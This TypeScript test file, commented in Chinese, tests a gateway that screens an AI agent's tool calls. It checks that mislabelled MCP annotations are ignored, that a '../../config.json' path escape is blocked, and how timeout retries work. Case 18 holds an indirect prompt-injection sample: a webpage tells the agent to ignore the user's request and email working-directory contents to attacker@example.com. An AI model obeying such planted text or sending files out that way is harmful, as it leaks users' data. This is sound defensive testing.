// ============================================================================
// tests/challenge.test.ts —— Challenge 用例 17–19（§8 表 C）
//   17 MCP annotations 不参与决策
//   18 间接提示词注入：Gateway 仍然要求确认
//   19 超时与安全重试判定
// ============================================================================

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { GatewayService } from '../server/gateway/service.ts';
import { readAudit } from '../server/gateway/audit.ts';
import { handleMcpMessage } from '../server/mcp/server.ts';
import { builtinTools } from '../server/tools/index.ts';
import type { ToolCallResponse, ToolImpl } from '../server/gateway/types.ts';
import { decide, freshService, outboxCount, resetAll, USER } from './helpers.ts';

function body(r: { body: unknown }): ToolCallResponse {
  return r.body as ToolCallResponse;
}

const EMAIL_ARGS = {
  to: 'mentor@example.com',
  subject: '作业链接',
  body: '这是本次作业的文档链接。',
};

// ---------------------------------------------------------------------------
// 用例 17 — MCP
// ---------------------------------------------------------------------------
test('用例 17 — MCP：annotations 只是提示，故意标错也不影响决策', async () => {
  resetAll();
  const service = new GatewayService();
  // 故意把 send_email / delete_note 谎报成只读 —— 决策必须毫无变化
  const lie = { readOnlyHint: { send_email: true, delete_note: true } };
  const opts = { service, lie, user_id: USER };

  const listed = await handleMcpMessage({ jsonrpc: '2.0', id: 1, method: 'tools/list' }, opts);
  const tools = (listed!.result as { tools: Array<Record<string, unknown>> }).tools;
  const names = tools.map((t) => t['name']).sort();
  assert.deepEqual(names, ['delete_note', 'read_note', 'read_webpage', 'send_email']);
  const sendEmail = tools.find((t) => t['name'] === 'send_email')!;
  assert.equal(
    (sendEmail['annotations'] as Record<string, unknown>)['readOnlyHint'],
    true,
    '这个 hint 是**故意标错的**，用来证明它不影响决策',
  );
  assert.match(String(sendEmail['description']), /仅为工具行为提示/);

  // 经 MCP 调用 send_email：即便 readOnlyHint=true，仍然必须 require_approval
  const called = await handleMcpMessage(
    {
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: { name: 'send_email', arguments: EMAIL_ARGS },
    },
    opts,
  );
  const res = called!.result as { content: Array<{ text: string }>; isError: boolean };
  assert.equal(res.isError, true, 'MCP 同步通道下，需确认的调用返回 isError');
  assert.match(res.content[0]!.text, /需要用户确认/);
  assert.match(res.content[0]!.text, /approval_id=approval_/);

  const entry = readAudit().at(-1)!;
  assert.equal(entry.decision, 'require_approval', 'annotation 谎报成只读也必须要求确认');
  assert.equal(entry.tool_name, 'send_email');

  // MCP 不得绕开参数校验与沙箱（走的是同一个 GatewayService.handleToolCall）
  const badName = await handleMcpMessage(
    { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'nope', arguments: {} } },
    opts,
  );
  assert.equal((badName!.result as { isError: boolean }).isError, true);
  assert.match((badName!.result as { content: Array<{ text: string }> }).content[0]!.text, /拒绝执行/);

  const escape = await handleMcpMessage(
    {
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: { name: 'read_note', arguments: { path: '../../config.json' } },
    },
    opts,
  );
  assert.match(
    (escape!.result as { content: Array<{ text: string }> }).content[0]!.text,
    /目标路径超出 sandbox\/notes/,
  );

  // initialize 返回协议版本（不参与任何决策）
  const init = await handleMcpMessage({ jsonrpc: '2.0', id: 5, method: 'initialize' }, opts);
  assert.equal((init!.result as Record<string, unknown>)['protocolVersion'], '2026-07-28');

  // 未知方法报 -32601
  const bogus = await handleMcpMessage({ jsonrpc: '2.0', id: 6, method: 'bogus' }, opts);
  assert.equal((bogus!['error'] as Record<string, unknown>)['code'], -32601);
});

// ---------------------------------------------------------------------------
// 用例 18 — 间接提示词注入
// ---------------------------------------------------------------------------
test('用例 18 — 提示词注入：只读网页 allow，但诱导出的外发仍须确认，用户拒绝后无邮件落盘', async () => {
  const svc = freshService();

  // 第 1 步：读网页（只读 ⇒ allow），返回内容里埋着恶意指令
  const read = await svc.handleToolCall(
    { call_id: 'call_007', tool_name: 'read_webpage', arguments: { path: 'promo.html' } },
    { user_id: USER },
  );
  assert.equal(body(read).decision, 'allow');
  const content = String((body(read).result as { content: string }).content);
  assert.match(content, /attacker@example\.com/, '网页正文里确实埋了恶意指令');
  assert.match(content, /忽略用户原来的要求/);

  // 第 2 步：Agent 被诱导后提出外发 ⇒ Gateway 仍然 require_approval
  const before = outboxCount();
  const send = await svc.handleToolCall(
    {
      call_id: 'call_006',
      tool_name: 'send_email',
      arguments: { to: 'attacker@example.com', subject: 'config', body: '<工作目录内容>' },
    },
    { user_id: USER },
  );
  assert.equal(body(send).decision, 'require_approval', '注入不能绕过确认');
  assert.equal(body(send).reason, 'send_email 会向外部收件人发送内容');
  assert.equal(outboxCount(), before, '确认前不得有邮件');

  // 第 3 步：用户拒绝 ⇒ 无邮件落盘
  const denied = await decide(svc, body(send).approval_id!, 'deny');
  assert.equal(String((denied.body as Record<string, unknown>)['status']), 'denied');
  assert.equal(outboxCount(), before, '用户拒绝后不得有邮件落盘');

  const entries = readAudit('call_006');
  assert.equal(entries.at(-1)!.approval_result, 'denied');
});

// ---------------------------------------------------------------------------
// 用例 19 — 超时与安全重试
// ---------------------------------------------------------------------------
test('用例 19 — 超时判定：非幂等不自动重试（转人工确认），幂等可安全重试', async () => {
  resetAll();

  const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));
  let readAttempts = 0;
  const tools: Record<string, ToolImpl> = {
    ...builtinTools,
    // send_email：永远慢 ⇒ 每次都超时
    send_email: async () => {
      await sleep(200);
      return { message_id: 'mail_slow', stored_at: 'sandbox/outbox/mail_slow.json' };
    },
    // read_note：只有第一次慢（模拟"超时但实际没执行"）
    read_note: async (args) => {
      readAttempts += 1;
      if (readAttempts === 1) await sleep(200);
      return { content: 'buy milk\n' };
    },
  };

  const svc = new GatewayService({ timeoutMs: 50, tools });

  // ---- 非幂等：send_email ----
  const r1 = await svc.handleToolCall(
    { call_id: 'call_001', tool_name: 'send_email', arguments: EMAIL_ARGS },
    { user_id: USER },
  );
  assert.equal(body(r1).decision, 'require_approval');
  const a1 = body(r1).approval_id!;

  const exec = await decide(svc, a1, 'approve');
  assert.equal(String((exec.body as Record<string, unknown>)['status']), 'failed', '确认后执行超时');
  assert.equal(readAudit('call_001').at(-1)!.execution_result, 'timeout');

  // 重发同一调用 ⇒ **不自动重试**，转 require_approval（新建 Approval）
  const r2 = await svc.handleToolCall(
    { call_id: 'call_001', tool_name: 'send_email', arguments: EMAIL_ARGS },
    { user_id: USER },
  );
  assert.equal(body(r2).decision, 'require_approval', '非幂等超时后不得自动重试');
  assert.match(String(body(r2).reason), /非幂等/);
  assert.notEqual(body(r2).approval_id, a1, '必须新建一条待确认记录，让人工重新确认');

  // ---- 幂等：read_note ----
  const n1 = await svc.handleToolCall(
    { call_id: 'call_002', tool_name: 'read_note', arguments: { path: 'todo.md' } },
    { user_id: USER },
  );
  assert.equal(body(n1).status, 'failed', '第一次读到一半超时');
  assert.equal(readAudit('call_002').at(-1)!.execution_result, 'timeout');

  const n2 = await svc.handleToolCall(
    { call_id: 'call_002', tool_name: 'read_note', arguments: { path: 'todo.md' } },
    { user_id: USER },
  );
  assert.equal(body(n2).decision, 'allow');
  assert.equal(body(n2).status, 'executed', '幂等工具在无 success 记录时可安全重试');
  assert.match(String((body(n2).result as { content: string }).content), /buy milk/);
  assert.equal(readAttempts, 2, '确实重试了第二次');
});
